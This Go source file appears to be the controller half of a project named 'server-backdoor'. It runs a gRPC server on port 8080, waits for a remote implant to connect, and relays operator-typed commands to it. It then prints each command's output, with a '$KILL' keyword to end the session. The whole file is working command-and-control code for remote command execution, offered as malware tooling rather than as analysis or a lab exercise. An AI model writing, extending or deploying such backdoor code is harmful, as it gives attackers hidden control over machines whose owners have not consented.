package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"server-backdoor/src/pb/backdoor"
	"strings"

	"google.golang.org/grpc"
	"google.golang.org/grpc/peer"
)

type server struct {
	backdoor.BackdoorServiceServer
}

func (s *server) RemoteExec(stream backdoor.BackdoorService_RemoteExecServer) error {

	ctx := stream.Context()

	p, ok := peer.FromContext(ctx)
	if ok {
		fmt.Println("Connection stablished with:", p.Addr.String())
	} else {
		fmt.Println("Failed to retrieve peer info")
	}

	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("Command > ")

		if !scanner.Scan() {
			if err := scanner.Err(); err != nil {
				fmt.Printf("Error to read the command: %v\n", err)
			}
			break
		}

		cmd := scanner.Text()

		if strings.TrimSpace(cmd) == "$KILL" {
			fmt.Println("Closing connection...")
			break
		}

		if err := stream.Send(&backdoor.Out{Output: cmd}); err != nil {
			return fmt.Errorf("error to send command: %v", err)
		}

		resp, err := stream.Recv()
		if err != nil {
			return fmt.Errorf("error to recieve response: %v", err)
		}

		fmt.Println()
		fmt.Println("+-------------------------------------+")
		fmt.Println("================RESULT=================")
		fmt.Println(resp.Output)
		fmt.Println("+-------------------------------------+")
		fmt.Println()
	}

	return nil
}

func main() {
	port := ":8080"
	listener, err := net.Listen("tcp", "0.0.0.0"+port)
	if err != nil {
		panic(err)
	}
	s := grpc.NewServer()

	backdoor.RegisterBackdoorServiceServer(s, &server{})

	fmt.Printf("Server waiting connection on localhost%v...\n", port)
	if err := s.Serve(listener); err != nil {
		panic(err)
	}
}
